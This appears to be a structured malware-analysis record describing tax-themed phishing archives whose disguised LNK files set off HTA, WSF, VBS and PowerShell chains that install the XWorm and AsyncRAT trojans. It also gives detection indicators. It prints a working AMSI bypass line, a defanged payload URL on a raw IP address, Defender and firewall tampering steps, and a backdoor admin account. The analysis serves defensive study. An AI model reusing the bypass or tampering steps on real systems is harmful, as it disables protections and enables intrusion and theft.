package_info.package_name: 2022 tax_documents.zip / TaxReturn2022.img / TaxReturns2022.pdf.iso (XWorm & AsyncRAT delivery chains)
package_info.package_manager: N/A (malicious archive/disc image distribution via phishing)
package_info.package_versions: N/A (malware campaign, not a software package version)
package_info.why_malicious: These archives and disc images are distributed via phishing and contain a chain of malicious scripts and shortcut files that ultimately deliver commodity RATs (XWorm, AsyncRAT). The infection chain abuses legitimate Windows scripting and system utilities to disable security controls, establish persistence, and provide remote access to attackers, resulting in credential theft, data exfiltration, and full system compromise.

execution_context.file_location: Robert tax_docs.pdf.lnk (LNK file disguised as PDF)

malicious_snippets.code_behavior: Upon user execution, the LNK file launches a legitimate Windows script with crafted arguments to download and execute a remote HTA file, initiating the malware chain.

malice_analysis.why_suspicious: LNK files disguised as PDFs are a common phishing technique. The use of a legitimate system script with crafted arguments to download and execute remote code is a known malware delivery tactic.
malice_analysis.violated_expectations: Normal PDF files should not be LNK shortcuts or execute scripts. Legitimate LNK files should not download and execute remote code.
malice_analysis.similar_legitimate_use: IT administrators may use LNK files for automation, but not for downloading code from untrusted sources.

malicious_snippets.code_behavior: At runtime, the HTA file uses PowerShell to download a remote file (note.gif) and execute it, continuing the infection chain.

malice_analysis.why_suspicious: HTA files are often abused for malware delivery. Downloading and executing files from the internet is highly suspicious.
malice_analysis.violated_expectations: HTA files should not be used to download and execute arbitrary code in normal business workflows.
malice_analysis.similar_legitimate_use: Software updaters may download updates, but not via HTA in this manner.
key_indicators: PowerShell used for file download and execution

malicious_snippets.code_snippet: Creates: C:\Users\Public\onedrive.vbs, C:\Users\Public\test.vbs, C:\Users\Public\onedrive.ps1; Executes onedrive.vbs and test.vbs
malicious_snippets.code_behavior: At runtime, the script creates multiple VBS and PowerShell files, then executes them to further the infection and establish persistence.

malice_analysis.why_suspicious: A file with a .gif extension containing a PowerShell script is deceptive. Creating and executing multiple scripts in public directories is a known malware tactic.
malice_analysis.violated_expectations: Image files should not contain executable code. Scripts should not be dropped and executed from public directories.
malice_analysis.similar_legitimate_use: None; this is a clear abuse.

malicious_snippets.code_snippet: Runs onedrive.ps1 (PowerShell script with AMSI bypass and Defender tampering)
malicious_snippets.code_behavior: At runtime, the VBS script launches a PowerShell script that disables security controls and prepares the system for RAT deployment.

malice_analysis.why_suspicious: Chaining VBS and PowerShell scripts to disable security is a hallmark of malware.
malice_analysis.violated_expectations: Legitimate scripts should not disable security features or launch further scripts in this manner.

malicious_snippets.code_snippet:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Changes COM server for AMSI
disable Windows Defender features (adds exclusions, disables ASR, disables MAPS, disables real-time monitoring, disables scheduled scan, disables UAC, stops and deletes WinDefend service, creates admin user 'System32' with password '123', adds to RDP group, disables firewall)
# Reflectively loads and injects XWorm RAT
malicious_snippets.code_behavior: At runtime, the script disables AMSI, tampers with Windows Defender and firewall settings, creates a new admin user, and reflectively loads the XWorm RAT, granting full attacker control.

malice_analysis.why_suspicious: Disabling security controls, creating admin users, and reflectively loading malware are all highly malicious actions.
malice_analysis.violated_expectations: Legitimate PowerShell scripts should not disable security, create backdoor users, or inject RATs.
malice_analysis.similar_legitimate_use: Some enterprise deployment scripts may adjust Defender settings, but not to this extent or for these purposes.

execution_context.trigger: user-execution (manual opening of LNK file in TaxReturn2022.img/iso)

malicious_snippets.code_snippet: Downloads and executes wed.hta from hxxp://179.43.175[.]187/pqpf/
malicious_snippets.code_behavior: Upon user execution, the LNK file downloads and executes a remote HTA file, starting a new infection chain.

malice_analysis.why_suspicious: LNK files disguised as PDFs are used for social engineering. Downloading and executing remote code is a clear malware tactic.
malice_analysis.violated_expectations: PDFs should not be LNK files or execute code.

malicious_snippets.code_snippet: PowerShell code to download TaxReturn2022.pdf (decoy), set registry for persistence, sleep, then download and execute TCywxTOvZk.wsf
malicious_snippets.code_behavior: At runtime, the HTA script downloads a decoy PDF, sets persistence via registry, then downloads and executes a WSF script to continue the malware chain.

malice_analysis.why_suspicious: HTA files setting persistence and chaining downloads are classic malware behaviors.
malice_analysis.violated_expectations: HTA files should not set registry run keys or download further scripts.

malicious_snippets.code_behavior: At runtime, the WSF script downloads and executes a remote VBScript file, continuing the infection chain.

malice_analysis.why_suspicious: WSF files are rarely used legitimately and are often abused for malware delivery.
malice_analysis.violated_expectations: WSF files should not download and execute remote code.
key_indicators: WSF file downloads and executes code

malicious_snippets.code_behavior: At runtime, the VBScript downloads and executes a PowerShell script disguised as a PNG image.

malice_analysis.why_suspicious: Using image extensions for scripts is a known evasion technique.
malice_analysis.violated_expectations: Image files should not contain executable code.

malicious_snippets.code_snippet: Creates: C:\ProgramData\Document\py.ps1, C:\ProgramData\schtasks\Microsoft.bat, C:\ProgramData\Document\x.ps1; Runs Microsoft.bat, which uses MSHTA.exe to run py.ps1; py.ps1 reflectively loads PE files and installs AsyncRAT.
malicious_snippets.code_behavior: At runtime, the script creates and executes multiple files, using MSHTA and PowerShell to load and execute AsyncRAT, granting remote access to the attacker.

malice_analysis.why_suspicious: Chaining multiple scripts, using MSHTA for execution, and reflectively loading RATs are all highly malicious.
malice_analysis.violated_expectations: Legitimate scripts should not create and execute chains of scripts to install RATs.

attack_chain.action: User opens malicious LNK file disguised as a PDF, which launches a legitimate Windows script with crafted arguments to download and execute a remote HTA file.
HTA file uses PowerShell to download and execute a remote PowerShell script (note.gif).
PowerShell script creates and executes multiple VBS and PowerShell files to establish persistence and prepare for RAT deployment.
attack_chain.leads_to: Security feature tampering and RAT deployment

attack_chain.action: PowerShell script disables AMSI, Windows Defender, firewall, creates admin user, and reflectively loads XWorm RAT.
Alternative chain: User opens LNK file in TaxReturn2022.img/iso, which downloads and executes a remote HTA file.
HTA file downloads a decoy PDF, sets registry persistence, then downloads and executes a WSF script.
WSF script downloads and executes a remote VBScript file.
VBScript downloads and executes a PowerShell script disguised as a PNG image.
PowerShell script creates and executes multiple files, using MSHTA and PowerShell to load and execute AsyncRAT.

behavioral_signatures: LNK files disguised as PDFs or Office documents
HTA, WSF, and VBS files downloaded and executed in sequence
PowerShell scripts with AMSI bypass and Defender tampering
Reflective loading of PE files via PowerShell
Persistence via registry Run keys for decoy files
file_indicators: Files with mismatched extensions (e.g., .gif or .png containing scripts)
HTA/WSF/VBS files in %USERAPPDATA% or public directories
detection_knowledge.how_to_detect: Monitor for LNK files with misleading icons and extensions, especially those that launch scripts or download remote content. Detect execution of HTA, WSF, and VBS files from user directories or as a result of LNK file execution. Alert on PowerShell scripts that disable AMSI, tamper with Defender, or create unauthorized users. Look for persistence mechanisms that launch decoy files at startup. Correlate with network traffic to known malicious infrastructure and C2 domains.
